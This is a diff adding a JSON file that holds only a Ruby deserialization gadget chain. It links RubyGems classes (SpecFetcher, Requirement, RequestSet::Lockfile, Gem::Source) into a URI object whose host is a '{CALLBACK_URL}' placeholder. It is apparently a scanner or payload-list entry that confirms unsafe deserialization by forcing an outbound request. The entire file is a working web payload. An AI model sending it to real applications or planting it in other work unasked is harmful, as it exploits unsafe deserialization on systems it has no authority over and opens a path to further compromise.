@@ -1,0 +1,25 @@
+{
+    "^#1": [
+      [ { "^c": "Gem::SpecFetcher" },
+        { "^o": "Gem::Requirement",
+          "requirements": [
+            ["~>",
+              { "^o": "Gem::RequestSet::Lockfile",
+                "set": {
+                  "^o": "Gem::RequestSet",
+                  "sorted_requests": [
+                    { "^o": "Gem::Resolver::IndexSpecification",
+                      "source": {
+                        "^o": "Gem::Source",
+                        "uri": {
+                          "^o": "URI::HTTP",
+                          "host": "{CALLBACK_URL}?",
+                          "port": "any",
+                          "scheme": "s3", "path": "/", "user": "any", "password": "any"
+                        }}}]},
+                "dependencies": []
+              }]]}
+      ],
+      "any"
+    ]
+  }
